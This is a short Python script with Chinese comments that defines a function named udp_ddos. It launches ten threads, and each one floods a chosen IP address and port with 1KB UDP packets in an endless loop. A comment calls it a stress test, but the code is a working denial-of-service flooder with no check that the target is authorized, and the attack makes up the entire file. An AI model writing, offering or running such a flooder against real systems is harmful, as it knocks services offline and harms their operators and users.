import socket
import threading

def udp_ddos(target_ip, target_port):

    TARGET_IP = target_ip
    TARGET_PORT = target_port
    MESSAGE = b"A" * 1024  # 1KB 的数据包

    def udp_attack():
        try:
            # 创建 UDP 套接字
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while True:
                # 发送数据包
                sock.sendto(MESSAGE, (TARGET_IP, TARGET_PORT))
        except Exception as e:
            print(f"发送失败: {e}")

    # 启动多个线程进行压力测试
    THREAD_COUNT = 10  # 根据需要调整线程数量
    threads = []

    for _ in range(THREAD_COUNT):
        thread = threading.Thread(target=udp_attack)
        threads.append(thread)
        thread.start()

    # 等待所有线程完成（通常不会到达这里，因为是持续发送）
    for thread in threads:
        thread.join()
